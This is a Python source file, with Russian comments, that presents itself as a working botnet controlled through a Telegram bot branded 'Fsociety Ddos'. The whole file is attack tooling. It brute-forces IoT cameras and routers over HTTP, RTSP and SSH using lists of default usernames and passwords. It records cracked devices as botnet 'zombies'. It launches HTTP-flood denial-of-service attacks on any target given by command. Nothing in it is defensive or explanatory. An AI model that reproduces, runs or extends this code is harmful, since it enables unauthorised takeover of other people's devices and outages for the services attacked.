#!/usr/bin/env python3
"""
HYBRID BOTNET – WORKING VERSION
- Telegram-бот (проверено, что отвечает)
- Взлом камер/роутеров (HTTP, RTSP, SSH)
- Зомби-ботнет
- DDoS (HTTP flood)
- Без Shodan (упрощённо)
"""

import os
import asyncio
import random
import time
import json
import base64
import socket
import logging
import requests
import paramiko
import aiohttp
from fastapi import FastAPI
import uvicorn
from contextlib import asynccontextmanager
from telegram.ext import Application, CommandHandler

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# ------------------------------------------------------------
#  Конфигурация
# ------------------------------------------------------------
DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
os.makedirs(DATA_DIR, exist_ok=True)

STATS_FILE = os.path.join(DATA_DIR, "stats.json")

def load_stats():
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE) as f:
            return json.load(f)
    return {"total_requests": 0, "cracked_devices": []}

def save_stats(stats):
    with open(STATS_FILE, 'w') as f:
        json.dump(stats, f)

stats = load_stats()

# ------------------------------------------------------------
#  Зомби-ботнет
# ------------------------------------------------------------
class ZombieAgent:
    def __init__(self, ip, dtype, ssh=None):
        self.ip = ip
        self.type = dtype
        self.ssh = ssh

    async def execute_attack(self, target_url):
        # Простой HTTP-флуд (для камер и роутеров без SSH)
        async with aiohttp.ClientSession() as session:
            for _ in range(50):
                try:
                    await session.get(target_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=2)
                except:
                    pass
        return True

class ZombieBotnet:
    def __init__(self):
        self.zombies = []

    async def add_zombie(self, ip, dtype, ssh=None):
        self.zombies.append(ZombieAgent(ip, dtype, ssh))

    async def launch_attack(self, target):
        await asyncio.gather(*[z.execute_attack(target) for z in self.zombies])

    def size(self):
        return len(self.zombies)

# ------------------------------------------------------------
#  Взломщик IoT (HTTP, RTSP, SSH)
# ------------------------------------------------------------
class IoTExploiter:
    def __init__(self, botnet):
        self.botnet = botnet
        self.usernames = [
            "admin", "root", "user", "support", "guest", "administrator", "operator",
            "service", "tech", "dvr", "ipcam", "admin1", "admin2", "supervisor"
        ]
        self.passwords = [
            "admin", "1234", "12345", "password", "pass", "123456", "root", "user",
            "support", "guest", "admin123", "adminadmin", "12345678", "123456789",
            "qwerty", "abc123", "111111", "000000", "888888", "666666", "admin1",
            "admin2", "ipcam", "dvr", "123", "password123", "letmein", "welcome",
            "changeme", "default", "1234567890", "123123", "0000", "1111", "222222"
        ]
        self.common_ports = [80, 8080, 554, 8000, 5000, 443, 8443, 37777, 81, 88]

    async def brute_http(self, ip, port):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    r = requests.get(f"http://{ip}:{port}", auth=(u, p), timeout=3)
                    if r.status_code == 200:
                        return (u, p)
                except:
                    continue
        return None

    async def brute_rtsp(self, ip, port=554):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((ip, port))
                    creds = base64.b64encode(f"{u}:{p}".encode()).decode()
                    sock.send(f"DESCRIBE rtsp://{ip}:{port}/ RTSP/1.0\r\nCSeq: 1\r\nAuthorization: Basic {creds}\r\n\r\n".encode())
                    data = sock.recv(1024)
                    if b'200 OK' in data:
                        sock.close()
                        return (u, p)
                    sock.close()
                except:
                    continue
        return None

    async def brute_ssh(self, ip, port=22):
        for u in self.usernames:
            for p in self.passwords:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=port, username=u, password=p, timeout=3)
                    return (u, p, client)
                except:
                    continue
        return None

    async def hack_camera(self, ip, port=None):
        if port:
            ports = [port]
        else:
            ports = self.common_ports
        for p in ports:
            creds = await self.brute_http(ip, p)
            if creds:
                await self.botnet.add_zombie(ip, "camera")
                stats["cracked_devices"].append(f"camera_{ip}:{p}")
                save_stats(stats)
                return True
            if p == 554:
                creds = await self.brute_rtsp(ip, p)
                if creds:
                    await self.botnet.add_zombie(ip, "camera")
                    stats["cracked_devices"].append(f"camera_{ip}_rtsp")
                    save_stats(stats)
                    return True
        return False

    async def hack_router(self, ip, port=None):
        creds = await self.brute_http(ip, port or 80)
        if creds:
            await self.botnet.add_zombie(ip, "router")
            stats["cracked_devices"].append(f"router_{ip}")
            save_stats(stats)
            return True
        ssh_creds = await self.brute_ssh(ip)
        if ssh_creds:
            u, p, client = ssh_creds
            await self.botnet.add_zombie(ip, "router", client)
            stats["cracked_devices"].append(f"router_{ip}_ssh")
            save_stats(stats)
            return True
        return False

    async def hack_device(self, ip, device_type=None, port=None):
        if device_type == 'camera':
            return await self.hack_camera(ip, port)
        elif device_type == 'router':
            return await self.hack_router(ip, port)
        else:
            if await self.hack_camera(ip, port):
                return True
            return await self.hack_router(ip, port)

# ------------------------------------------------------------
#  DDoS-движок
# ------------------------------------------------------------
class DDoSEngine:
    async def http_flood(self, url):
        async with aiohttp.ClientSession() as session:
            for _ in range(500):
                try:
                    await session.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=2)
                except:
                    pass
        return True

    async def adapt_attack(self, target):
        await self.http_flood(target)
        return True

# ------------------------------------------------------------
#  Основной бот
# ------------------------------------------------------------
botnet = ZombieBotnet()
exploiter = IoTExploiter(botnet)
ddos_engine = DDoSEngine()

# ------------------------------------------------------------
#  FastAPI + Telegram
# ------------------------------------------------------------
TOKEN = os.environ.get("TELEGRAM_TOKEN")
if not TOKEN:
    raise Exception("TELEGRAM_TOKEN not set")

app = FastAPI()

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Запускаем Telegram-бота
    telegram_app = Application.builder().token(TOKEN).build()

    # Обработчик /start
    async def start(update, context):
        await update.message.reply_text(
            "Fsociety Ddos:\nБот запущен. Команды:\n"
            "/hack_device <ip> <camera|router> [port]\n"
            "/ddos <target>\n"
            "/status"
        )

    # Обработчик /hack_device
    async def hack_device(update, context):
        try:
            if len(context.args) < 2:
                await update.message.reply_text("Использование: /hack_device <ip> <camera|router> [port]")
                return
            ip = context.args[0]
            dtype = context.args[1] if context.args[1] in ['camera', 'router'] else None
            port = None
            if len(context.args) > 2:
                try:
                    port = int(context.args[2])
                except:
                    pass
            # Взлом с таймаутом 30 секунд
            res = await asyncio.wait_for(exploiter.hack_device(ip, dtype, port), timeout=30)
            if res:
                await update.message.reply_text(f"Fsociety Ddos:\nУстройство {ip} взломано и добавлено в ботнет.")
            else:
                await update.message.reply_text(f"Fsociety Ddos:\nНе удалось взломать {ip}.")
        except asyncio.TimeoutError:
            await update.message.reply_text(f"Fsociety Ddos:\nПревышено время ожидания при взломе {ip}.")
        except Exception as e:
            logging.error(f"Hack error: {e}")
            await update.message.reply_text(f"Fsociety Ddos:\nОшибка: {str(e)}")

    # Обработчик /ddos
    async def ddos(update, context):
        target = context.args[0] if context.args else ""
        if not target:
            await update.message.reply_text("Использование: /ddos <target>")
            return
        # Запускаем атаку в фоне, чтобы не блокировать ответ
        asyncio.create_task(ddos_engine.adapt_attack(target))
        asyncio.create_task(botnet.launch_attack(target))
        await update.message.reply_text(f"Fsociety Ddos:\nАтака на {target} запущена с {botnet.size()} зомби.")

    # Обработчик /status
    async def status(update, context):
        msg = (f"Fsociety Ddos:\nЗомби: {botnet.size()}\n"
               f"Взломано устройств: {len(stats['cracked_devices'])}")
        await update.message.reply_text(msg)

    telegram_app.add_handler(CommandHandler("start", start))
    telegram_app.add_handler(CommandHandler("hack_device", hack_device))
    telegram_app.add_handler(CommandHandler("ddos", ddos))
    telegram_app.add_handler(CommandHandler("status", status))

    await telegram_app.initialize()
    await telegram_app.start()
    await telegram_app.updater.start_polling()
    logging.info("Telegram bot started")

    yield
    # Остановка при завершении
    await telegram_app.stop()

app.router.lifespan_context = lifespan

@app.get("/")
def root():
    return {"status": "alive", "zombies": botnet.size()}

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
